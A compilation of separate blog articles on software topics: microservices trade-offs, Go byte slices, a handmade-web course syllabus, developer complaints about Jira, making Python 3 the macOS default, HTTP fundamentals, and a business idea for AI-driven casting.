safer than larger ones, your teams can now deploy faster. Heck, they could even roll back now.</p><p><strong><em>Separate concerns</em></strong></p><p>You’ll force stronger code boundaries. No more commits breaking unrelated components</p><p><strong><em>Empower teams</em></strong> </p><p>You’ll be able to use the right tools for the job. No more need to have the same language or stack. Teams can use whatever will make the most productive at solving their particular problem.</p><p><strong><em>Ensure quality</em></strong></p><p>You’ll be able to clarify ownership. No more spaghetti code because service owners will ultimately be responsible</p><h2>Uh Oh</h2><p>This is the dream. You kick off that initiative. But…you see some serious costs:</p><p><strong><em>Hardened boundaries are harder to change</em></strong></p><p>Those strict code boundaries come with their own costs. If you split incorrectly, you’re prone to dupe your data and your logic. But, even if you split correctly, what happens when your business needs change? What if you get new regulation that requires system-wide changes? All of a sudden, the way you split those services won’t make sense anymore, and evolving those boundaries become a magnitude more difficult.</p><p><strong><em>Hardened boundaries make it more difficult to ship unanticipated changesets</em></strong></p><p>What if you need to make changes that your org and service structure didn’t anticipate? These changes won’t cleanly fit into one service, or even groups of services. All of a sudden a change that could have been done by one engineer before requires teams to align to deliver. </p><p><strong><em>Hardened boundaries reduce the potential impact of your engineers</em></strong></p><p>What if one of your engineers comes up with a performance improvement, or a new idea for the business? Their impact is now constrained by the services they have control over. If the languages are different they won’t be able to actualize that performance improvement for the whole company. Even if we force all services to use the same language, delivering that to all services becomes a difficult affair.</p><p><strong><em>More Incidental complexity</em></strong></p><p>Sharing code, managing deploys, logging infrastructure, service orchestration, rpc are all made more difficult by a change to multiple services. None of the added difficulty helps you move faster or ship with higher quality. </p><h2>Root Cause</h2><p>Why so many unanticipated issues? Because microservices as a strategy is a <strong>blanket solution.</strong> </p><p>Blanket solutions don’t <em>specifically</em> address any one issue, but try to address a multitude of issues. This is often done with philosophy (new principles we will follow to build things) then with technology (how exactly we will solve problems). Whenever a solution addresses a multitude of issues with philosophy, it’s likely to come with a multitude of unanticipated problems.</p><h2>An Alternative Path</h2><p>The alternative path is evolution. As a rule of thumb, the changes you introduce should concretely solve the problems you care about. This doesn’t mean that all solutions need to be iterative, but it does mean that all solutions need to be under strong selection pressure. Every solution should have immediate wins in sight.</p><p>For example: </p><p><strong><em>Deployment, CI, logging issues?</em></strong> </p><p><em>What if you built a centralized team that owned that complexity, and built infrastructure so product engineers didn’t have to worry about it? For example, most product engineers did not have to worry about deploys, observability, or logging at Facebook. Infra was already in place that they could leverage, managed by an underlying team.</em></p><p><strong><em>Code boundary issues?</em></strong> </p><p><em>What if you evolved your system to use</em> <em>immutable structures</em> <em>and</em> <em>smaller interfaces between boundaries**?  What if you pushed some of these problems down the stack? For example, there may be a lot of complexity introduced with privacy. You can centralize that concern, into building infrastructure with a small interface, that product engineers can use. Facebook did this with viewer context</em></p><p><strong><em>Scaling issues?</em></strong>  </p><p><em>This may be a true concern, but instead of applying a general philosophy, could we focus on solving this problem directly? Do all systems need to scale independently, or does it only matter that just a few things scale independently?  exactly are the problems? Could you address with</em> <em>only changing the hottest, most intensive paths?</em></p><p><strong><em>Complexity issues?</em></strong> </p><p><em>Where is the complexity exactly? Could we evolve modules so you could localize the reasoning behind them? Could we abstract the difficult portions? Sophie Alpert gives a great example of this</em> <a href="https://sophiebits.com/2020/01/01/fast-maintainable-db-patterns.html" target="_blank"><em>here</em></a></p><p>This kind of thinking leads to a philosophy of system design based on simplicity:</p><p><em>You address problems concretely with a view towards evolving your system.</em> At each step of the way, you constantly optimize for engineering velocity. Engineering velocity is a great metric to use, because it implies correctness and quality alongside with speed. It’s impossible to ship if you don’t have confidence in your system. You push and centralize complexity down the stack. You evolve your system so product engineers can think locally within the module they’re working on. You make changes that empower any engineer to drive impact throughout the stack.</p><p>Doing this won’t be a magic pill — it will look like your system is constantly broken and in need of improvement — but that is its secret weapon. You’re constantly evolving it. </p><p><em>Thanks to Daniel Woelfel, Jacky Wang, Kam Leung, Joe Averbukh, Phil Nachum, Alexandre Lebrun, for reviewing drafts of this essay</em></p></span></p></div></div></div>]]>

Globally this number is even higher. Given this, it is extremely difficult for casting directors to find high-quality talent.</p><p><strong>Solution: </strong>An algorithmic casting director that can analyze the audio and video submissions from candidates to determine if they would be a good fit for the role. Right now, casting directors have to watch each individual video in order to determine whether or not to move someone forward in the process. Given that these directors are looking at hundreds or thousands of videos, this leads to implicit bias. Thus, the business would attempt to eliminate bias and increase diversity in casting by being more objective and (hopefully) more accurate in finding high-quality artists.</p><p>One great model for this business is HireVue. As the <a href="https://www.washingtonpost.com/technology/2019/10/22/ai-hiring-face-scanning-algorithm-increasingly-decides-whether-you-deserve-job/">Washington Post wrote in October 2019</a>, </p><blockquote><p><em>Designed by the recruiting-technology firm HireVue, the system uses candidates’ computer or cellphone cameras to analyze their facial movements, word choice and speaking voice before ranking them against other applicants based on an automatically generated “employability” score.</em></p><p><em>HireVue’s “AI-driven assessments” have become so pervasive in some industries, including hospitality and finance, that universities make special efforts to train students on how to look and speak for best results. More than 100 employers now use the system, including&nbsp;</em><a href="https://jobs.hilton.com/select-country.php" target="_blank"><em>Hilton</em></a><em>&nbsp;and&nbsp;</em><a href="https://www.unilever.com/careers/" target="_blank"><em>Unilever</em></a><em>, and more than a million job seekers have been analyzed.</em></p></blockquote><p>Some researchers claim that “digital snake oil — an unfounded blend of superficial measurements and arbitrary number-crunching that is not rooted in scientific fact.“ While this is a fair concern, one assumption is that in the next decade as AI and ML technologies advance, these systems will become more and more accurate and trustworthy. </p><p>Some of the most successful casting agencies <a href="https://www.managerskills.org/management/talent-agencies/">make upwards of $7 billion annually</a>. Major players in this field include CAA, <a href="http://www.icmtalent.com/">ICM</a>, <a href="https://www.wmeagency.com/">William Morris</a> (<a href="https://www.nytimes.com/2009/04/28/business/media/28talent.html">merged with Endeavour about a decade ago</a>), and <a href="https://www.businessinsider.com/wme-acquires-img-in-huge-22-billion-deal-2013-12">Silver Lake Partners</a> (<a href="https://deadline.com/tag/silver-lake-partners/">details about them</a> here, they also <a href="https://deadline.com/2012/05/wme-internally-announces-equity-partner-265482/">own 31% of WME</a>).

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Coding is a tool, but there is so much depth within that it often feels like an art form. There are many ways to approach the same problem with different frameworks, languages, and architectures. The end product could be the same but look totally different under the hood. This is the underlying reason coding is so dangerous for developers. With so much freedom, we can lose sight of the original goal: solving a problem.</p><p>It’s very easy to dive into a project and decide that you should build it from scratch because you’re a developer, you can code! You have the magic power to bring amazing things into being with only a keyboard! You start building, troubleshooting bugs you didn’t imagine would pop up to ruin your plans. Then, the features you pictured in your head turn out to be significantly more complicated. Hours later, you discover a spreadsheet and Google form could solve it in a few minutes. It’s an amazing feeling to see your work come to life, but it can blind us to the simple solutions that we can discover with a little more patience.</p><p>Alright, so you’ve searched around and mulled it over, it actually does make sense to build something new to solve your problem. Awesome, you’ve been meaning to try out that brand new language you found! Chances are, you won’t be the last person working on this solution though. Will the next person have the experience &amp; knowledge to maintain a niche language? Does it put your company in a position where their <a href="https://en.wikipedia.org/wiki/Bus_factor">bus factor</a> is just you?</p><p>Fine, we decided it made more sense to use technologies that are more stable and commonplace, even if they aren’t as exciting. Well, this should incorporate some machine-learning background jobs to give us insights on the best path forward, right? Maybe a little blockchain under the hood? It also needs to be multi-region &amp; scalable to the nth degree to make sure we can handle the millions of users waiting around the corner for this. If it’s not fully resilient, they won’t want to use it! Developers love adding features and improving software, especially the ones who care about the craft. Like artists, they will never be satisfied with their work and can always find something to tweak. Eventually, the energy is better spent elsewhere. We forget to ask ourselves “Are these features actually what people need/asked for?".</p><p>The danger in these situations is when coding becomes a ‘feel-productive’ task while not moving you closer to a solution. This happens because of the disconnect between the actions taken that let us check off boxes (writing a new feature, deploying the service, etc.) with the actual planned outcome. It feels great to see progress, but if that path leads to nowhere you are just wasting time.</p><p>The possibilities available when you know how to code are staggering. It’s easy to become lost in the void of possibilities, losing your tether to your original goal. Next time you’re looking over a project ask yourself:</p><ul><li>Does it need code?</li><li>What is the Simple Lovable Complete (<a href="https://blog.asmartbear.com/slc.html">SLC</a>) version of the solution?</li><li>What tech stack makes the most sense for the context of the project, rather than what is shiny and interesting?</li><li>Am I actually making progress toward this goal or do I just feel productive? (Ask this one regularly)</li></ul></div><div><div><p><a href="https://idontremember.imprint.to/">I Don't Remember</a></p><p>Thoughts on life, software, and making products.</p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
              <p>Before coming to Go, I had spent years cushioned by the high level of abstraction of Web frameworks such as <a href="https://spring.io/projects/spring-framework">Spring</a> or <a href="https://dotnet.microsoft.com/apps/aspnet">ASP.NET</a>. Thus, I was set aback when I first encountered Go's ubiquitous <em>byte slice</em> (<code>[]byte</code>).</p><p>To say that byte arrays are unique to Go will of course be a big lie. Computers communicate using bytes. Thus, any form of data exchange between a software application and its external environment is an array of bytes. This includes IO, database, network, data conversion, and many other kinds of operations.</p><p>While other technologies try to abstract away from working with byte arrays directly, in Go they are everywhere. Go's term for byte arrays of unspecified length is called a "byte slice", but the concept is pretty much the same. You will use byte slices when reading a file, for example:</p><pre><code>f, err := os.Open("./input.txt")
defer f.Close()
if err != nil {
    // handle the error
}

buf := bytes.NewBuffer(make([]byte, 0))
buf.ReadFrom(f)
fmt.Printf(string(buf.Bytes()))
</code></pre><p>Converting to/from XML, JSON, or other transport formats:</p><pre><code>jsonString := `{"Foo": "Bar"}`

// Parse the incoming JSON string
type S struct{ Foo string }
var s S
json.Unmarshal([]byte(jsonString), &amp;s)

// Turn into XML
xmlResult, _ := xml.MarshalIndent(&amp;s, "", "")

// Write to a file
ioutil.WriteFile("out.txt", xmlResult, 0644)
</code></pre><p>Or the mother-of-all-examples, handling an HTTP request:</p><pre><code>func postTodo(w http.ResponseWriter, r *http.Request) {
    var todo Todo
    err := json.NewDecoder(r.Body).Decode(&amp;todo)
    defer r.Body.Close()
    if err != nil {
        // handle the error
    }

    err = store.addTodo(todo)
    if err != nil {
        // handle the error
    }

    w.WriteHeader(http.StatusOK)
    json.NewEncoder(w).Encode(todo)
}
</code></pre><h2 id="reader-and-writer">Reader and Writer</h2><p>Go's standard library provides two extremely convenient interfaces to wrap around the use of byte array's: <code><a href="https://golang.org/pkg/io/#Reader">Reader</a></code> and <code><a href="https://golang.org/pkg/io/#Writer">Writer</a></code>. Those two are the poster children of the concept of interfaces in Go. They are super simple (each having only a single method to implement). This is the reason why they are used all over the place in the standard library and in many Go projects. Make your custom type implement one or the other (or both), and it gets superpowers. You can serialize it, store it on disk, or send in network requests. All that using the standard library alone, without having to write any additional code.</p><h2 id="the-cost-of-abstractions">The Cost of Abstractions</h2><p>As mentioned in the beginning, I frowned upon seeing byte slices the first time around. I had worked with Java's <code>InputStream</code> and <code>OutputStream</code> before, as well as with their .NET Stream equivalent. While one can find them used in foundational libraries and frameworks, their use in applications is rather sparse.</p><p>The reasons could be many. One that comes to mind are the complex class hierarchies built around each, which make the right choice difficult, and the usage cumbersome. Another, might be the use of reflection everywhere. While an HTTP request in Spring or ASP.NET can be handled similarly to its Go equivalent, working with bytes directly is an exceptional case. The accepted solution is to use reflection, in order to cast incoming byte arrays to typed objects:</p><pre><code>[HttpPost]
public async Task&lt;ActionResult&lt;TodoItem&gt;&gt; PostTodoItem(TodoItem todoItem)
{
    _store.TodoItems.Add(todoItem);
    await _store.SaveChangesAsync();
    return todoItem;
}
</code></pre><p>This is a great example of hiding complexity behind abstractions, and is how the majority of modern software gets developed. For decades, the Computer Science curriculum preached to students the values of not repeating oneself (DRY). Only in the last few years, did people start to question DRY's practicality.</p><p>Abstractions are great when things work fine, but terrible when they break. The probability of something crumbling down is directly proportional to its level of complexity. The deeper in the abstraction chain a problem occurs, the more difficult and costly it is to fix. This is where Computer Science theory meets hard reality.</p><h2 id="sticking-to-go-s-minimalism">Sticking to Go's Minimalism</h2><p>Go's creators wanted a pragmatic language for tooling, backend, and systems programming. One that doesn't hide complexity from the developer. Go intentionally makes certain things verbose, and favors copying over premature dependency. It may not be the most elegant programming language, but it plays its part really well.</p><p>Along with error handling and the lack of generics, the prevalent use of byte slices evoked resistance at first, but I quickly got used to it.</p><hr><figure><a href="https://medium.com/@tyler_brewer2/bits-bytes-and-byte-slices-in-go-8a99012dcc8f"><div><p>Bits, Bytes, and Byte Slices in Go</p><p>If you come from a background other than Computer Science and learned programming through a higher level language such as Ruby (like I did), you may have never really “needed” to be concerned about…</p><p><img src="https://cdn-images-1.medium.com/fit/c/152/152/1*8I-HPL0bfoIzGied-dzOvA.png"><span>Medium</span></p></div><p><img src="https://miro.medium.com/max/1200/1*hNlOKSdJjr-Af1R5snxIMQ.png"></p></a></figure>

            “I evoke the term ‘handmade web’ to suggest slowness and smallness as forms of resistance.”<br>
            —— J. R. Carpenter
          </p><p>The hand has become increasingly less present in the web as we know it today. Websites are automated or built from templates, and the knowledge of how to make a website is relegated to a select few. It has only gotten easier to learn and make on the web, but the idea and perceived requirements for a website have become so convoluted and arcane that many avoid the subject. This course seeks to dispel these ideas and will emphasize the hand-quality of websites by developing an understanding of the best practices, language, history, and present context of the web. We will examine the space of the web at large and explore and challenge what a website is and can be with the hopes of reclaiming an important creative space.</p><p>The websites we will make may be small, but their hearts will be big.</p><p>The first half of the class will be technically focused. It will comprise of a series of lessons, readings, workshops, and small projects to develop familiarity and confidence with the language of the web. We will focus on the basic languages of web development: HTML, CSS, and a little Javascript. This class is designed for students with no programming experience at all, but should be friendly to any skill level. The second half will be focused on a larger project website.</p><div>

          
          <p>This class will place heavy emphasis on the hand, craft, and care of your design and code. We will learn how to borrow and learn from others’ code, but we will strive to understand how to code it ourselves. This class will question much of what is commonly understood about the web and technology in general.</p>
          <ul>
            <li>Is tech always the answer? (“There’s an app for that…”)</li>
            <li>Why put something on the web?</li>
            <li>How can we think about accessibility, legibility, efficiency, and speed on the web?</li>
          </ul>

          <hr>

          
          <p>The first goal of this class is to demystify and remove the barrier for entry into web development and programming. Any and all questions are welcome. I will not know every answer, but we can work together to find one (and there are always many when it comes to programming). Learning how to search is the programmer’s greatest tool.</p>
          <p>By the end of the class you will:</p>
            <ul>
              <li>Have a working knowledge of HTML, CSS, and basic Javascript</li>
              <li>Understand the design principles particular to the web and dynamic media</li>
              <li>Have a basic understanding of web publishing</li>
              <li>Have an understanding of the history and present context of web</li>
              
            </ul>

          <hr>

          
          <p>Early in the semester we will set up individual class websites to house all products of this class (projects, writing, anything else…). We will host them using Github Pages and purchase a domain name to attach to it. You can design and organize this however you like, so long all content is accessible and easily found——I will be grading from this!</p>

          <hr>

          
          <p>For assigned readings I will ask you to respond to the reading with a rough written/sketched website concept (or, if you want, a coded sketch of the website) that reacts to the concepts and topics of the reading. Then, upload this response to your class site. Use this as an opportunity to catalogue some ideas for future web projects (either in this class or beyond!).</p>
          <p>There will be some time for reading discussions, but class time will largely be reserved for work, review, and activities. However, these readings will help facilitate a common understanding about the history and present context of the web. Ideally, they will also serve as inspiration for you (as they have been for me!).</p>
          <p>For each week that we have a reading for, only choose 1 to respond to. For example: if there are 3 assigned readings in a week, only respond to one of those.</p>
          <p>More details can be found in the <a href="https://handmade-web.net/fall20/projects/reading.html">project page</a>.</p>

          <hr>

          
          <p>During the first half of the class we will work on a series of smaller projects to practice and experiment with designing for the web:</p>
            <ol>
              <li><a href="https://handmade-web.net/fall20/projects/article.html">Article</a></li>
              <li><a href="https://handmade-web.net/fall20/projects/screensaver.html">Screensaver</a></li>
              <li><a href="https://handmade-web.net/fall20/projects/secret.html">Secret</a></li>
              <li><a href="https://handmade-web.net/fall20/projects/aura.html">Aura</a></li>
            </ol>
          <p>Details for each project will be outlined on the <a href="https://handmade-web.net/fall20/projects/index.html">Projects</a> page.</p>

          <hr>

          
          <p>The final project will take up the last half of the class. It can be anything you like: a project you’ve had in mind for some time; an extension of your practice or an even larger project outside of this class. What is important is the craft, care, and concept of the project. It will be graded on these qualities. It should be unique, personal, and a world of its own.</p>

          <hr>

          
          <p>For each major project there will be an informal presentation and feedback session. As much of this class is focused on technical introduction and skill-building, the finished projects will likely still be works in progress (the web is always under construction). Treat these sessions as opportunities to ask technical or conceptual questions to push your projects further!</p>
          <p>Beyond these review sessions I would encourage everyone to regularly share work and code inside and out of class!</p>

          <hr>

          
          <p>
            40% —— Participation<br>
            40% —— Process<br>
            20% —— Execution
          </p>

          <hr>

          
          <p>This class will require a computer, a text-editor (I recommend <a href="https://atom.io/">Atom</a>), and a browser (<a href="https://www.google.com/chrome/">Chrome</a>). I would also suggest a sketchbook for much encouraged off-screen thinking, note-taking, sketching, and journaling.</p>

          <p>More details can be found in the <a href="https://handmade-web.net/fall20/library.html">Library</a>.</p>

          <hr>

          
          <p>This class will take place entirely online, with some flexibility on potentially meeting in person for individual meetings. Unless stated otherwise, we will regularly meet (synchronously) during the scheduled class times using Zoom.</p>
          <p>You will also have access to the scheduled class space in Pollak Room 317 if you want to use that space during class time, though we will still all collectively meet online through Zoom. One thing to note is that departmental policy, at the time, only allows 10 students in a classroom at a time and only during the scheduled class time. Please make sure to prioritize your own safety and the safety of others when using public spaces!</p>
          <p>We can consider this a feature rather than a hinderance for learning web design as we will inhabit and communicate within the environment that we will be making for!</p>

          <hr>

          
          <p>As this class will take place online, we will be using a <a href="https://discord.com/" target="_blank">Discord</a> server to centralize communication and announcements for the class. The Discord will also serve as a space for feedback and comments during feedback sessions. If there are any updates/changes to the class I will announce them on the Discord, so be sure to check often.</p>

          <hr>

          
          <p>The standard VCU attendance policy states that student absences during the semester are not expected to exceed the number of times the class meets in one week (2). This semester, because we are facing unprecedented circumstances, we will be following a revised policy that addresses larger issues of expected engagement in the course, articulated below. Consistent engagement is a vital component of successful completion of the course objectives.</p>
          <p>The progression of this course requires all participants to be present and actively engaged in class, both during synchronous on-screen meetings, in-person, and with asynchronous activities. Consistency of engagement is vital for a successful completion of the course objectives. Each of us carries different circumstances and capacities; we are accountable for our own agency. This is always true, but especially crucial now.</p>
          <p>If at any point during the semester you are unable to be present, communicate this with me as soon as you can. While presence in class is important, my primary concerns with this class are your wellbeing and an emphasis on not applying unnecessary pressure in an already difficult period. Please remember to prioritize your mental and physical health over school.</p>

          <hr>

          
          <p>The University requires all students and faculty to be aware of policies outlining expectations, requirements and student services related to  academic life. Please visit the following link and review these at the start of each semester: <a target="_blank" href="https://go.vcu.edu/syllabus">go.vcu.edu/syllabus</a>
          </p>

          </p>

          <hr>

          
          <p>This syllabus and class’s foundation has a number of sources to thank</p>
          <ul>
            <li><a href="http://laurelschwulst.com/">Laurel Schwulst</a> —— whose published syllabi and class portals served as my own unbidden introduction to web design. Much of the pacing and tone of this class is modeled after her approach.</li>
            <li><a href="http://mindyseu.com/">Mindy Seu</a> —— whose classes and workshops have helped expand my thought around digital pedagogy.</li>
            <li>Roy McKelvey —— whose generously provided syllabus has served as the organizational structure of this class.</li>
          </ul>

<p>This blog is not about how project management tools are too complex and over-engineered with features dev teams don’t need.</p>



<p>Those complaints are well articulated by others like Justin James, Chief Architect at Cloud Development Resources.</p>

<p><em>“Jira has *never once* made my life as a developer easier or better… It’s overly complicated and the workflow is painful.”&nbsp;</em></p>



<p>Justin goes on to say…&nbsp;</p>



<p><em>“Jira is Word when it had the toolbar filled with tiny little icons for formatting only paralegals or scientists or some other specialized author needed. It does *all this stuff* and none of it is easy or makes sense…”&nbsp;</em></p>

<p>Most popular project management tools are highly configurable which can be a plus and a minus depending on how your company has it set up. </p>



<p>So if project tools have so much flexibility, why do so many organizations configure them in a way that causes their dev teams to complain? </p>







<h4><strong>Project management tools are not perfect but they’re not the problem. The root cause of most complaints devs have with project tools are rooted in bad culture, bad management or bad process. </strong></h4>



<p>Let’s examine 4 of the most common complaints I’ve heard about project management tools from software development teams. </p>







<h3>1. “<strong>Project tools are made with PMs in mind, not dev teams</strong>“</h3>



<p>Justin said <em>“I wish Atlassian would sit down with real-world developers and design this product the way we need it to work.”&nbsp;</em></p>



<p>I’ve heard this complaint from a lot of devs. “Project tools were made with project managers and product managers in mind. Not dev teams.” It is true. Project and product managers (collectively referred to as PMs going forward) are the usually primary buyers and owners of project management systems. Not engineers.&nbsp;</p>



<p>I’ve also heard “the development process is fluid, real-time, and doesn’t always follow a linear path. Project tools force you into a workflow that does not match that reality.” </p>



<p>So why do companies use a tool that works for a few PMs and business leaders when some engineers dislike it so much?&nbsp;</p>



<p><strong>The real issue: Executives force top-down decision making on dev teams</strong></p>



<p>Some companies embrace a mindset of decisions being made by a few people “at the top”. In their world, the planning process is king. The creating process is an afterthought.&nbsp;</p>







<figure><picture>
<source type="image/webp" srcset="https://linearb.io/wp-content/uploads/2020/08/Blog-Jira-4.png.webp 1386w" sizes="(max-width: 1386px) 100vw, 1386px">
<img src="https://linearb.io/wp-content/uploads/2020/08/Blog-Jira-4.png" alt="" srcset="https://linearb.io/wp-content/uploads/2020/08/Blog-Jira-4.png 1386w, https://linearb.io/wp-content/uploads/2020/08/Blog-Jira-4-300x143.png 300w, https://linearb.io/wp-content/uploads/2020/08/Blog-Jira-4-1024x488.png 1024w, https://linearb.io/wp-content/uploads/2020/08/Blog-Jira-4-768x366.png 768w" sizes="(max-width: 1386px) 100vw, 1386px">
</picture>
</figure>







<p>The current software delivery process revolves around pushing decisions down to dev teams and forcing engineers to push status updates back up. This system ensures executives are the only ones who have context and can see the bigger picture while engineers do all of the work.&nbsp;</p>



<p>This is backwards. It holds us back from building the best product and slows us down from delivering faster.&nbsp;</p>



<figure><blockquote><p>Join our mission to end useless status meetings.</p><p><a href="https://linearb.io/status-updates-on/" target="_blank" rel="noreferrer noopener">Click here for access</a>&nbsp;to the dev team dashboard of the future powered by Git data.</p></blockquote></figure>







<h3>2. “<strong>Project tools are plan-first tools, not a develop-first tool</strong>s”</h3>



<p>It makes sense. PM’s, who own Jira, spend a lot of time on ideas, strategy, prioritization, requirements gathering, and preparing for the future. They want a tool that helps them succeed in those areas. Once the iteration starts, PMs shift from being planners to being status communicators. Jira is designed this way. It’s pretty good when you’re in the planning phase and it works well if you’re the PM receiving the status update.</p>



<p>But when you’re in the development phase, it’s not as well suited to dev team tasks. If you’re the engineer who has to constantly manually update the status, it’s annoying. </p>



<p>I see the merit behind this argument. Dev teams live elsewhere like in Git and Slack.&nbsp;Stopping to login in to another system throughout the day is not ideal. </p>



<p>What PMs do is really important – being the voice of the customer, planning, prioritizing and communicating with the rest of the business.  They need tools for this. </p>



<p>I also think dev teams need tools that reflect the fluidity of the development process. It’s sort of like the famous Mike Tyson quote… <em>“Everybody has a plan until they get punched in the mouth.”</em> Once development starts, a million micro-decisions are being made every hour and things change quickly. Most project tools are not set up for this reality.&nbsp;</p>

<p>The problem is we’re taking different groups of people who spend their time in different ways and forcing them in to one workflow. 80% of the people involved in software development spend 80% of their time in the development phase. In most companies, fewer people spend less time in the planning phase.&nbsp;</p>



<p>So why are we using a plan-first tool to manage the full development lifecycle?&nbsp;</p>



<p><strong>The real issue: Many execs get product strategy but not product development</strong></p>



<p>Most business leaders think like PMs, not like engineers. Executives understand ideas, strategy, and prioritization. They’re also familiar with the process and key metrics of sales and marketing. They know the vocabulary and speak the language.&nbsp;</p>



<p>They do not understand software development as well. They don’t know the terms. When it comes to the dev team, most just want to know “are we on track to deliver feature XYZ by the deadline?”&nbsp;</p>

<p>This is dangerous because it holds them back from understanding our process which holds them back from engaging in intelligent conversations with engineering leaders and teams.&nbsp;</p>



<p>If sales miss their number, the CEO has 100 questions ready to analyze what levers they can pull to right the ship. If the dev team misses a deadline, other than maybe asking “do we need to work more hours?”, all they can do is wait or apply (unhelpful) artificial pressure to finish.&nbsp;</p>



<p>How we work matters. Not just the output.&nbsp;</p>







<h3>3. <strong>“Project tools perpetuate synchronous communication, not asynchronous</strong>” </h3>



<p>Project management tools seems like it should encourage asynchronous communication. But in my experience they do the opposite. </p>



<p>When execs have a meeting with a customer or the sales team, they need information about product delivery timelines and they need it now. They ask the PM and the PM sends you an urgent Slack. Or worse, the PM calls you into a meeting to find out what’s going on. Those interruptions are costly.&nbsp;</p>











<p>Why doesn’t the exec or the PM just look at project board? Because it’s not up to date. Why? Things change so rapidly that, in order for the board to be up to date, engineers would need to constantly manually update tickets. One engineering manager told me recently that even teams he’s worked on that really care about project tool hygiene only capture about 60-70% of their real work activity. Most teams are closer to 50%.&nbsp;</p>



<p>Even if the project board was up to date, it’s still missing context.&nbsp;</p>



<p>Execs and PMs want to know:&nbsp;</p>



<ul><li>When is the bug going to be fixed?&nbsp;</li><li>When is the new feature being delivered?&nbsp;</li><li>What risks could stop us from hitting our date?&nbsp;</li><li>Which features are getting attention right now and which aren’t?&nbsp;</li><li>What % of the team is invested in features versus bugs versus non-functional?&nbsp;</li></ul>



<p>There’s nothing on the project board that answers those questions. So they pull you away from deep focus mode to ask you. And it takes you a while to get your focus back. Which slows you down from delivering the thing they want most of all – more features.&nbsp;</p>



<p><strong>The real issue: Companies run on a “manager’s schedule” not a “maker’s schedule”&nbsp;&nbsp;</strong></p>



<p>Paul Graham, computer programmer and co-founder of Y Combinator, explains the disconnect between the way developers and executives get work done in his 2009 essay <em>Maker’s Schedule, Manager’s Schedule</em>.&nbsp;</p>



<p>Here’s a summary:&nbsp;</p>



<ul><li>Bosses (managers) get stuff done through meetings – changing tasks every 60 minutes.</li><li>Developers (makers) and other creators need 3-4 hour blocks of time to get work done.</li><li>Each way of working is perfectly fine by itself but problems arise when the two collide.</li><li>For a maker, a single meeting at the wrong time can disrupt their entire day of work.</li><li>Most powerful people are on a manager schedule and they directly or indirectly force the makers in their company, like software engineers, to revolve around the way they work.&nbsp;</li></ul>







<p>I couldn’t agree more with Paul. The lack of understanding some execs have for the software development process, leads to a lack of empathy for software developers. Companies subject their engineers to the manager’s schedule which disrupts the flow of development.&nbsp;</p>



<p>When engineers point out they could ship more features faster if there were fewer meetings, business leaders hear that as a complaint versus what it really is, a cry for help.&nbsp;</p>







<h3>4. “Project tools <strong>create separation between engineers and PMs</strong>“</h3>



<p>Some devs describe their interactions with their PM in a way that reminds me of <a rel="noreferrer noopener" href="https://www.youtube.com/watch?v=Fy3rjQGc6lA&amp;feature=youtu.be" target="_blank">Peter from Office Space</a> when his boss asks him for the new cover sheet on the TPS report.&nbsp;</p>

<p>In the real world, most devs I know really value their PMs. Great PMs allow engineers to do great work. I’ve worked with some awesome ones. </p>



<p>But the <a rel="noreferrer noopener" href="https://linearb.io/blog/vp-engineering-vp-product-how-to-keep-a-united-front/" target="_blank">PM + engineer relationship is hard to get right</a>. Having additional tension built-in makes it even harder.&nbsp;</p>



<p>It’s just not engineers that don’t like having to share status updates all day. PMs don’t want to bug us either! They feel like babysitters. Imagine what they could be doing instead… talking to customers, writing high-quality user stories… or actually spending their time with us on something useful like brainstorming ideas or sharing customer feedback. </p>



<p><strong>The real issue: Some companies are lacking empathy and understanding between different departments. </strong></p>



<p>I’m lucky to work at a company where our CEO (Ori Keren) and our COO (me) are software engineers. We ensure everyone in the company understands the development process which helps maintain tight alignment between our dev, marketing, customer success, and sales teams.&nbsp;</p>



<p>I think more start-ups should be led by programmers and more big companies should promote their CTOs to CEO.&nbsp;</p>

		<p>While <code>macOS</code> ships with Python 2 by default, you can install set Python 3 as the default Python version on your Mac.</p>
<p>First, you install Python 3 with Homebrew.</p>
<pre><code>brew update &amp;&amp; brew install python
</code></pre>
<p>To make this new version your default add the following line to your <code>~/.zshrc</code> file.</p>
<pre><code>alias python=/usr/local/bin/python3
</code></pre>
<p>Then open a new Terminal and Python 3 should be running.</p>
<p>Let's verify this is true.</p>
<pre><code>python --version # e.g. Python 3.8.5
</code></pre>
<h2>How do I find the <code>python3</code> path?</h2>
<p>Homebrew provides info about any installed "bottle" via the <code>info</code> command.</p>
<pre><code>brew info python
# python@3.8: stable 3.8.5 (bottled)
# Interpreted, interactive, object-oriented programming language
# https://www.python.org/
# /usr/local/Cellar/python@3.8/3.8.5 (4,372 files, 67.7MB) *
# ...
</code></pre>
<p>And you can find the path we're looking for <code>grep</code>.</p>
<pre><code>brew info python | grep bin
# /usr/local/bin/python3
# /usr/local/opt/python@3.8/libexec/bin
</code></pre>
<h2>How do I use Python 2 if I need it?</h2>
<p>Your system's Python 2.7 is still there.</p>
<pre><code>/usr/bin/python --version # e.g Python 2.7.16
</code></pre>
<p>You can also use Homebrew's Python 2.</p>
<pre><code>brew install python@2
</code></pre>

<p>I’ve been doing web development for a pretty long time, but just over the last few years I’ve come to really appreciate the fundamentals of HTTP, what’s going on under the hood when I’m building web applications. There are two sides of this. The first is that HTTP is in one sense a very simple protocol. It’s just little text messages going back and forth between your browser and the web server. Whether I’m using Node or Django or some huge WSDL-driven Java XML-Beans monstrosity, what it’s doing isn’t rocket science; it’s just taking care of a bunch of tedious, nit-picky bookkeeping that I don’t want to be bothered with. If I really wanted to, I could just type the messages myself (and we’ll get to that in a minute).</p>

<p>The practical upside of that is that you can use really simple tools to debug big, hairy, complex web applications. A few years ago, I was working in one of those Big Web Services systems with WSDL files and auto-generated Java code and layers and layers of middleware. We’d get some kind of error at the front end, and it’d be really hard to tell which piece had broken. So I ended up writing a bunch of really simple shell scripts to test the web services in isolation. I’d spackle together something using <code>curl</code>, <code>grep</code>, and <code>sed</code> that built up and picked apart the messages as text, without dragging in all that mess of Java code.</p>

<p>The flip side is that HTTP is actually a richer protocol than I’d realized. There’s a lot I didn’t know about it until I started building RESTful web services and trying to understand the “right” way to do it. There’s all this stuff you can do with status codes and headers that I’d been re-implementing at the application level.</p>

